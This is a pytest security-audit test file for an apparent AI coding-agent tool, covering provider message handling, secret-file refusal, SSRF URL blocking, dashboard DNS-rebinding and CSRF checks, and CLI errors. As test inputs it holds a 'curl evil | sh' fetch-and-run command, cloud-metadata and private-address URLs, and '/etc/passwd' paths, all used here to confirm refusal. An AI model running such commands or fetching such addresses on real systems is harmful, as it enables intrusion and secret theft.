"""Break-it audit (2026-11-12), part 2: provider adapters, dashboard server, CLI."""

from __future__ import annotations

import json
import subprocess
from types import SimpleNamespace as NS

import pytest
from typer.testing import CliRunner

from guild.config import (
    ProjectConfig,
    load_profile,
    load_project_config,
    save_project_config,
)
from guild.providers.anthropic_provider import _to_anthropic
from guild.providers.base import Message, ToolCall
from guild.providers.openai_compat import OpenAICompatProvider
from guild.tools.registry import ToolContext, _blocked_url, dispatch
from guild.workflow import Guild, Plan, Task

# ------------------------------------------------------------------ anthropic message shape

HISTORY = [
    Message("system", "sys"),
    Message("user", "go"),
    Message("assistant", "", tool_calls=[ToolCall("c1", "read_file", {"path": "a.py"})]),
    Message("tool", "x = 1", tool_call_id="c1", name="read_file"),
    Message("assistant", ""),  # the model returned nothing
    Message("user", "Your reply did not match the required JSON contract"),
]


def _blocks(msgs):
    for m in msgs:
        content = m["content"]
        yield from ([{"type": "text", "text": content}] if isinstance(content, str) else content)


def test_anthropic_never_sends_empty_text():
    _, msgs = _to_anthropic(HISTORY)
    for b in _blocks(msgs):
        if b["type"] == "text":
            assert b["text"].strip(), msgs


def test_anthropic_repair_turn_without_tools_has_no_tool_blocks():
    """The JSON-repair call passes tools=None; the API rejects tool_use/tool_result blocks in
    a request that defines no tools."""
    _, msgs = _to_anthropic(HISTORY, flatten_tools=True)
    kinds = {b["type"] for b in _blocks(msgs)}
    assert kinds == {"text"}, kinds
    text = json.dumps(msgs)
    assert "read_file" in text and "x = 1" in text  # the information is still there
    _, with_tools = _to_anthropic(HISTORY)
    assert {"tool_use", "tool_result"} <= {b["type"] for b in _blocks(with_tools)}


# ------------------------------------------------------------------ openai-compatible adapter


def _chunk(tool_calls=None, content=None, finish=None):
    delta = NS(content=content, tool_calls=tool_calls)
    return NS(usage=None, choices=[NS(delta=delta, finish_reason=finish)])


def _tc(index, id=None, name=None, args=None):
    return NS(index=index, id=id, function=NS(name=name, arguments=args))


class _Client:
    def __init__(self, behaviour):
        self.calls: list[dict] = []
        self.chat = NS(completions=NS(create=self._create))
        self._behaviour = behaviour

    def _create(self, **kwargs):
        self.calls.append(kwargs)
        return self._behaviour(kwargs)


def _provider(client) -> OpenAICompatProvider:
    p = OpenAICompatProvider("ollama")
    p._client = client
    return p


def test_streamed_tool_calls_sharing_index_zero_stay_separate():
    """Ollama sends each tool call of a turn with index 0; they used to be glued together."""
    chunks = [
        _chunk([_tc(0, "call_a", "read_file", '{"path": "app.py"}')]),
        _chunk([_tc(0, "call_b", "write_file", '{"path": "b.py", ')]),
        _chunk([_tc(0, None, None, '"content": "x"}')]),  # continuation of call_b
        _chunk(finish="tool_calls"),
    ]
    comp = _provider(_Client(lambda kw: iter(chunks))).complete(
        "m", [Message("user", "hi")], None, 100, 0.2, on_token=lambda t: None
    )
    calls = comp.message.tool_calls
    assert [(c.name, c.arguments) for c in calls] == [
        ("read_file", {"path": "app.py"}),
        ("write_file", {"path": "b.py", "content": "x"}),
    ]


def test_streamed_tool_call_split_over_chunks_still_assembles():
    chunks = [
        _chunk([_tc(0, "call_a", "read_", None)]),
        _chunk([_tc(0, None, "file", '{"pa')]),
        _chunk([_tc(0, None, None, 'th": "a.py"}')]),
        _chunk([_tc(1, "call_b", "run_tests", "{}")]),
    ]
    comp = _provider(_Client(lambda kw: iter(chunks))).complete(
        "m", [Message("user", "hi")], None, 100, 0.2, on_token=lambda t: None
    )
    assert [(c.name, c.arguments) for c in comp.message.tool_calls] == [
        ("read_file", {"path": "a.py"}),
        ("run_tests", {}),
    ]


class BadRequestError(Exception):
    pass


def test_bad_request_about_a_parameter_is_adapted_not_fatal():
    def behaviour(kw):
        if "max_tokens" in kw:
            raise BadRequestError(
                "Unsupported parameter: 'max_tokens'. Use 'max_completion_tokens' instead."
            )
        if "temperature" in kw:
            raise BadRequestError("Unsupported value: 'temperature' only supports the default")
        msg = NS(content='{"ok": true}', tool_calls=None)
        return NS(choices=[NS(message=msg, finish_reason="stop")], usage=None)

    client = _Client(behaviour)
    comp = _provider(client).complete("m", [Message("user", "hi")], None, 100, 0.2)
    assert comp.message.content == '{"ok": true}'
    assert client.calls[-1]["max_completion_tokens"] == 100
    assert "max_tokens" not in client.calls[-1] and "temperature" not in client.calls[-1]


def test_unfixable_bad_request_still_fails():
    from guild.providers.base import ProviderError

    def behaviour(kw):
        raise BadRequestError("context length exceeded")

    with pytest.raises(ProviderError) as ei:
        _provider(_Client(behaviour)).complete("m", [Message("user", "hi")], None, 100, 0.2)
    assert not ei.value.retryable


# ------------------------------------------------------------------ tools: secrets and SSRF


def test_agents_cannot_read_dotenv(project):
    (project / ".env").write_text("ANTHROPIC_API_KEY=sk-ant-secret\n")
    (project / ".env.local").write_text("TOKEN=sk-ant-secret\n")
    (project / ".env.example").write_text("ANTHROPIC_API_KEY=\n")
    ctx = ToolContext(
        root=project,
        ignore=ProjectConfig().ignore,
        test_command="",
        lint_command=None,
        sandbox=None,
    )
    assert dispatch(ctx, "read_file", {"path": ".env"}).startswith("refused")
    assert dispatch(ctx, "read_file", {"path": "./.env.local"}).startswith("refused")
    assert "sk-ant-secret" not in dispatch(ctx, "search", {"pattern": "sk-ant"})
    assert "ANTHROPIC_API_KEY" in dispatch(ctx, "read_file", {"path": ".env.example"})


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1:7331/api/state",
        "http://localhost:11434/api/tags",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/",
        "http://192.168.1.1/admin",
        "file:///etc/passwd",
        "ftp://example.com/x",
    ],
)
def test_web_fetch_refuses_local_and_private_addresses(url):
    assert _blocked_url(url), url


def test_docker_sandbox_mounts_git_and_guild_read_only(project, monkeypatch):
    from guild import sandbox

    (project / ".guild").mkdir(exist_ok=True)
    seen: dict = {}

    def fake_run(args, **kw):
        seen["args"] = args
        return NS(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(sandbox.shutil, "which", lambda name: "/usr/bin/docker")
    monkeypatch.setattr(sandbox.subprocess, "run", fake_run)
    res = sandbox.DockerSandbox(project).run("pytest -q")
    assert res.returncode == 0
    mounts = [seen["args"][i + 1] for i, a in enumerate(seen["args"]) if a == "-v"]
    assert any(m.endswith(":/work/.git:ro") for m in mounts), mounts
    assert any(m.endswith(":/work/.guild:ro") for m in mounts), mounts
    assert seen["args"][-3:] == ["sh", "-c", "pytest -q"]


def test_unknown_sandbox_kind_is_an_error_not_local(project):
    from guild.sandbox import make_sandbox

    with pytest.raises(ValueError):
        make_sandbox(project, "dockr")


# ------------------------------------------------------------------ dashboard server

pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402

from guild.ui import server  # noqa: E402

PLAN_ON_DISK = {
    "goal": "g",
    "roadmap": [],
    "tasks": [
        {"id": "T1", "title": "one", "description": "d", "status": "todo", "depends_on": []},
        {"id": "T2", "title": "two", "description": "d", "status": "todo", "depends_on": ["T1"]},
    ],
}


@pytest.fixture
def ui(project, cfg, profile):
    import yaml

    save_project_config(project, cfg)
    (project / ".guild" / "profiles").mkdir(parents=True, exist_ok=True)
    (project / ".guild" / "profiles" / "test.yaml").write_text(yaml.safe_dump(profile.model_dump()))
    (project / ".guild" / "plan.json").write_text(json.dumps(PLAN_ON_DISK))
    return TestClient(server.create_app(project), base_url="http://127.0.0.1:7331")


def test_requests_for_another_host_are_refused(project, ui):
    """DNS rebinding: evil.example resolves to 127.0.0.1, the browser sends Host: evil.example."""
    evil = TestClient(server.create_app(project), base_url="http://evil.example:7331")
    assert evil.get("/api/state").status_code == 403
    assert evil.get("/api/file", params={"path": "app.py"}).status_code == 403
    assert ui.get("/api/state").status_code == 200
    local = TestClient(server.create_app(project), base_url="http://localhost:7331")
    assert local.get("/api/state").status_code == 200


def test_cross_site_post_is_refused(ui, project):
    r = ui.post(
        "/api/config",
        json={"test_command": "curl evil | sh"},
        headers={"Origin": "https://evil.example"},
    )
    assert r.status_code == 403
    assert "curl" not in load_project_config(project).test_command
    ok = ui.post(
        "/api/config",
        json={"test_command": "python -m pytest -q"},
        headers={"Origin": "http://127.0.0.1:7331"},
    )
    assert ok.status_code == 200


def test_config_endpoint_validates(ui, project):
    assert ui.post("/api/config", json={"sandbox": "dockr"}).status_code == 400
    assert ui.post("/api/config", json={"profile": "../../etc/passwd"}).status_code == 400
    assert ui.post("/api/config", json={"profile": "nope"}).status_code == 400
    assert ui.post("/api/config", json={"roles_enabled": ["lead", "ghost"]}).status_code == 400
    assert load_project_config(project).sandbox == "local"


def test_task_edit_validates_and_delete_cleans_dependencies(ui, project):
    assert ui.post("/api/plan/task", json={"id": "NOPE", "title": "x"}).status_code == 404
    assert ui.post("/api/plan/task", json={"id": "T1", "status": "banana"}).status_code == 400
    assert ui.post("/api/plan/task", json={"id": "T1", "files": "app.py"}).status_code == 400
    assert ui.post("/api/plan/task", json={"id": "T1", "title": None}).status_code == 400
    plan = ui.post("/api/plan/task", json={"id": "T1", "delete": True}).json()
    assert [t["id"] for t in plan["tasks"]] == ["T2"]
    assert plan["tasks"][0]["depends_on"] == []
    # and the remaining task is runnable, not waiting for a ghost
    g = Guild(
        project,
        load_project_config(project),
        load_profile("test", project),
    )
    try:
        assert g.load_plan().next_task().id == "T2"
    finally:
        g.close()


def test_runs_listing_survives_a_trace_being_written(ui, project):
    run = project / ".guild" / "runs" / "20260101-000000-abcdef"
    run.mkdir(parents=True)
    (run / "trace.jsonl").write_text(
        '{"seq":1,"ts":1.0,"kind":"run_start","profile":"test"}\n'
        '{"seq":2,"ts":2.0,"kind":"model_call","role":"lead","model":"m","input_tokens":5,"output_tokens":7}\n'
        '{"seq":3,"ts":3.0,"kind":"model_ca'
    )
    r = ui.get("/api/runs")
    assert r.status_code == 200, r.text
    row = next(x for x in r.json() if x["id"] == run.name)
    assert row["calls"] == 1 and row["input_tokens"] == 5
    d = ui.get(f"/api/runs/{run.name}")
    assert d.status_code == 200 and len(d.json()["events"]) == 2


def test_merge_and_discard_report_errors_instead_of_500(ui, project):
    plan = json.loads((project / ".guild" / "plan.json").read_text())
    plan["tasks"][0]["branch"] = "precious"  # hand-edited plan pointing at a normal branch
    (project / ".guild" / "plan.json").write_text(json.dumps(plan))
    subprocess.run(["git", "branch", "precious"], cwd=project, check=True)
    r = ui.post("/api/branches/T1/discard", json={})
    assert r.status_code == 200 and r.json()["ok"] is False
    out = subprocess.run(["git", "branch"], cwd=project, capture_output=True, text=True).stdout
    assert "precious" in out
    assert ui.post("/api/branches/T9/merge", json={}).status_code == 404


def test_dashboard_escapes_attribute_values():
    from importlib import resources

    html = resources.files("guild.ui").joinpath("index.html").read_text(encoding="utf-8")
    esc_line = next(ln for ln in html.splitlines() if ln.startswith("const esc ="))
    assert "&quot;" in esc_line and "&#39;" in esc_line


# ------------------------------------------------------------------ CLI


def _cli_project(project, cfg, profile):
    import yaml

    save_project_config(project, cfg)
    (project / ".guild" / "profiles").mkdir(parents=True, exist_ok=True)
    (project / ".guild" / "profiles" / "test.yaml").write_text(yaml.safe_dump(profile.model_dump()))


def test_cli_run_unknown_task_id_is_a_clean_error(project, cfg, profile):
    from guild.cli import app

    _cli_project(project, cfg, profile)
    g = Guild(project, cfg, profile)
    g.save_plan(
        Plan(goal="g", roadmap=[], tasks=[Task(id="T1", title="[/oops] t", description="d")])
    )
    g.close()
    res = CliRunner().invoke(app, ["run", "NOPE", "-C", str(project)])
    assert res.exit_code == 2, res.output
    assert "no task NOPE" in res.output and "Traceback" not in res.output
    # model text that looks like rich markup must not crash `guild status`
    res = CliRunner().invoke(app, ["status", "-C", str(project)])
    assert res.exit_code == 0, res.output
    assert "[/oops]" in res.output


def test_cli_reports_invalid_config_instead_of_traceback(project, cfg, profile):
    from guild.cli import app

    _cli_project(project, cfg, profile)
    (project / ".guild" / "config.yaml").write_text("profile: test\nsandbox: dockr\n")
    res = CliRunner().invoke(app, ["status", "-C", str(project)])
    assert res.exit_code == 2 and "sandbox" in res.output


def test_init_keeps_hand_edited_settings(project, monkeypatch):
    from guild import hardware
    from guild.cli import app

    monkeypatch.setattr(hardware, "detect", lambda: hardware.Hardware(git=True))
    save_project_config(
        project,
        ProjectConfig(lint_command="ruff check .", ignore=[".git", ".guild", "data"]),
    )
    res = CliRunner().invoke(app, ["init", str(project), "-y", "--profile", "free"])
    assert res.exit_code == 0, res.output
    cfg = load_project_config(project)
    assert cfg.lint_command == "ruff check ." and "data" in cfg.ignore
